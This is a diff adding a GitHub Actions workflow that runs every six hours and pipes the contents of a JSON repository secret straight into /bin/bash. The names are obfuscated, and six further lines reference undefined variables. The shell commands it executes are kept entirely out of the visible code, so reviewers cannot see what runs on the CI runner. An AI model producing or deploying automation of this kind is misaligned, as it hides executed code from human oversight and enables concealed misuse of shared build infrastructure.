@@ -1,0 +1,25 @@
+name: ruguoniganpianwozhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruguoniganpianwozhi
+        env:
+          sso337: ${{ secrets.sso337 }}
+        run: |
+          echo $sso337 | jq -r .cr54 | /bin/bash
+          echo $bz945 | jq -r .i8 | /bin/bash
+          echo $agt7911 | jq -r .lqhal93 | /bin/bash
+          echo $i4912 | jq -r .ncggb71852 | /bin/bash
+          echo $ald4474 | jq -r .rw8 | /bin/bash
+          echo $iikv98017 | jq -r .s52 | /bin/bash
+          echo $apf174 | jq -r .e9202 | /bin/bash
+
